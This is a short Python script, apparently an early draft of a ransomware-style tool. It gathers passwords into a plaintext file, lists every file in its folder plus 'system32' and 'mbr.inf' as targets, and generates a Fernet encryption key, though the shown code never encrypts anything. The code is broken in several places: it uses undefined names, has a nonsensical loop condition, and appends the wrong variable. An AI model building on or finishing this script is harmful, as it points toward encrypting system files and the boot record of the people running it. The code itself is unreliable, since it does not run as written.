#Script is named match_key.py

from cryptography.fernet import Fernet
import os

#Initialize variables; Specifically the passkey variables
passkey = input("password 1: ")
add_key = input("password 1 ")
key_list = []
key_list.append(passkey)

encr_file_list = [ system32,mbr.inf]

#Checks if the user wants to input another key
while add_key == "password 1" or add_key == "password 1":
    key = input("password 1: ")
    key_list.append(passkey)
    add_key = input("Do you want to enter another key? (y/N) ")
    if add_key == "n" or add_key == "N":
        #Store the passwords in a file written to the disk
        with open("passwords.txt", "wb") as passwords:
            passwords.write(key_list)
        break
else:
    pass

print(key_list)

#Add each file of the directory to a list except for match_key.py and the encryption key
key = Fernet.generate_key()
for file in os.listdir():
    if file == "match_key.py":
        continue
    if os.path.isfile(file):
        encr_file_list.append(file)

print(encr_file_list)